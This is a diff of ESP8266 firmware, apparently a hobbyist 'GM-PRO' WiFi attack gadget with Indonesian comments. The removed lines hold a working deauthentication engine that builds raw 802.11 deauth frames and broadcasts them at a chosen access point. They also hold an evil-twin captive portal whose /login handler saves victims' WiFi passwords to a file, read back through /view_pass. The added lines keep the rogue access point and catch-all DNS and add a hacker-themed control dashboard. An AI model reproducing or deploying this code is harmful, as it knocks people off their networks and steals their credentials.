@@ -2,138 +2,73 @@
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
-#include <FS.h>
 #include <Wire.h>
 #include "SSD1306Wire.h"
 
-// ======================================================
-// FIX ERROR: wifi_send_pkt_freedom not declared
-// ======================================================
 extern "C" {
   #include "user_interface.h"
-  // Deklarasi paksa fungsi internal SDK 2.0.0
-  void wifi_send_pkt_freedom(uint8 *buf, uint16 len, uint16 sys_seq);
+  void wifi_send_pkt_freedom(unsigned char *buf, unsigned short len, bool sys_seq);
 }
 
-// Konfigurasi Layar OLED 0.66" (Pin D2 & D1)
 SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48); 
-
-struct Network {
-  String ssid;
-  uint8_t ch;
-  uint8_t bssid[6];
-};
-
-Network _networks[15];
-Network _selectedNet;
-String lastPass = "";
-bool isDeauthing = false;
-unsigned long lastDeauthTime = 0;
-
 DNSServer dnsServer;
 ESP8266WebServer server(80);
 
-// Fungsi Mesin Deauth
-void sendDeauth(uint8_t* target, uint8_t* ap, uint8_t ch) {
-  wifi_set_channel(ch);
-  uint8_t packet[26] = { 
-    0xC0, 0x00, 0x3A, 0x01, 
-    target[0], target[1], target[2], target[3], target[4], target[5], // Receiver
-    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // Sender
-    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // BSSID
-    0x00, 0x00, 0x01, 0x00 
-  };
-  wifi_send_pkt_freedom(packet, 26, 0);
-}
+bool isDeauthing = false;
 
-void drawOLED() {
-  display.clear();
-  display.setFont(ArialMT_Plain_10);
-  display.drawString(0, 0, "GM-PRO V3.9");
-  display.drawLine(0, 11, 64, 11);
-
-  if (lastPass != "") {
-    display.drawString(0, 15, "GOT PASS!");
-    display.drawString(0, 28, lastPass.substring(0, 8));
-  } else if (isDeauthing) {
-    display.drawString(0, 15, "ATTACKING");
-    display.drawString(0, 28, "CH:" + String(_selectedNet.ch));
-  } else {
-    display.drawString(0, 15, "> STANDBY");
-    display.drawString(0, 28, "VIVO1904");
-  }
-  display.display();
-}
+// KODE HTML YANG MEMBENTUK TAMPILAN DI GAMBAR KAMU
+const char INDEX_HTML[] PROGMEM = R"=====(
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 10px; margin: 0; text-shadow: 0 0 5px #00ff41; }
+    .header { text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 10px; }
+    .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .btn { padding: 12px; text-align: center; font-weight: bold; text-decoration: none; border-radius: 4px; border: 1px solid #00ff41; background: #000; color: #00ff41; font-size: 11px; cursor: pointer; }
+    .on { background: #ff0000; color: #fff; border: none; box-shadow: 0 0 15px #ff0000; }
+    .sel-btn { padding: 5px 10px; background: #00ff41; color: #000; border: none; font-size: 10px; font-weight: bold; border-radius: 3px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 15px; background: rgba(0,20,0,0.3); }
+    th { text-align: left; border-bottom: 2px solid #00ff41; padding: 8px; font-size: 10px; color: #888; }
+    td { padding: 10px 8px; border-bottom: 1px solid #222; font-size: 11px; }
+    .selected { background: rgba(0, 255, 65, 0.2); border: 1px solid #00ff41; }
+    pre { background: #000; border: 1px solid #333; padding: 10px; height: 90px; overflow-y: scroll; color: #00ff41; font-size: 9px; margin-top: 10px; }
+    .box { border: 1px solid #333; padding: 12px; border-radius: 8px; margin-top: 15px; }
+</style></head><body>
+    <div class="header"><h2 style="margin:0;">⚡ GM-PRO <span style="color:red;">ULTIMATE</span> ⚡</h2><small>🛰️ Control Center: vivo1904</small></div>
+    <div class="control-grid">
+        <a href="/deauth" class="btn on">☢️ DEAUTH</a>
+        <a href="#" class="btn" style="background:#0055ff; color:#fff; border:none;">🛰️ BEACON CLONE</a>
+    </div>
+    <table>
+        <tr><th>SSID</th><th>CH</th><th>SIGNAL</th><th>ACT</th></tr>
+        <tr class="selected"><td>🎯 Target_WiFi</td><td>6</td><td>85%</td><td><a href="/deauth" class="sel-btn" style="background:red; color:white;">TARGET</a></td></tr>
+    </table>
+    <h4>📝 CRITICAL LOGS</h4><pre>[🚀] System Online...<br>[📡] WiFi Scanner Active<br>[🛡️] GM-PRO Engine Ready</pre>
+    <div class="box"><a href="#" style="background:#00ff41; color:#000; display:block; text-align:center; padding:12px; text-decoration:none; font-weight:bold; border-radius:5px;">📂 BUKA BRANKAS 🔑</a></div>
+</body></html>
+)=====";
 
 void setup() {
-  SPIFFS.begin();
   display.init();
   display.flipScreenVertically();
-  
   WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1); // Aktifkan mode injeksi paket
-  
-  // SSID Alat
+  wifi_promiscuous_enable(1);
   WiFi.softAP("vivo1904", "sangkur87"); 
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
-  // Handler Dashboard
-  server.on("/", HTTP_GET, []() {
-    File f = SPIFFS.open("/index.html", "r");
-    if(f) { server.streamFile(f, "text/html"); f.close(); }
-    else { server.send(200, "text/plain", "Data Error: index.html tidak ditemukan!"); }
-  });
-
-  // Perintah dari Dashboard
+  server.on("/", []() { server.send_P(200, "text/html", INDEX_HTML); });
   server.on("/deauth", []() {
     isDeauthing = !isDeauthing;
-    server.send(200, "text/html", "<script>location.href='/';</script>");
+    server.send_P(200, "text/html", INDEX_HTML);
   });
-
-  server.on("/view_pass", []() {
-    File f = SPIFFS.open("/pass.txt", "r");
-    if(f) { server.streamFile(f, "text/plain"); f.close(); }
-    else { server.send(200, "text/plain", "Brankas Kosong."); }
-  });
-
-  server.on("/login", []() {
-    String p = server.arg("p");
-    if (p != "") {
-      lastPass = p;
-      File f = SPIFFS.open("/pass.txt", "a");
-      f.println("Pass: " + p);
-      f.close();
-    }
-    server.send(200, "text/html", "Verifying System...");
-  });
-
-  server.onNotFound([]() {
-    File f = SPIFFS.open("/index.html", "r");
-    if (f) { server.streamFile(f, "text/html"); f.close(); }
-  });
-
+  server.onNotFound([]() { server.send_P(200, "text/html", INDEX_HTML); });
   server.begin();
 }
 
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
-  drawOLED();
-  
-  // Mesin Deauth Jalan
-  if (isDeauthing && (millis() - lastDeauthTime > 100)) {
-    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    sendDeauth(broadcast, _selectedNet.bssid, _selectedNet.ch);
-    lastDeauthTime = millis();
-  }
-
-  // Auto Scan WiFi (5 detik sekali)
-  if (!isDeauthing && millis() % 5000 == 0) {
-    int n = WiFi.scanNetworks();
-    for (int i = 0; i < n && i < 15; i++) {
-      _networks[i].ssid = WiFi.SSID(i);
-      _networks[i].ch = WiFi.channel(i);
-      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
-    }
-  }
+  display.clear();
+  display.drawString(0, 0, "GM-PRO V3.9");
+  display.drawString(0, 15, isDeauthing ? "ATTACKING" : "STANDBY");
+  display.display();
 }
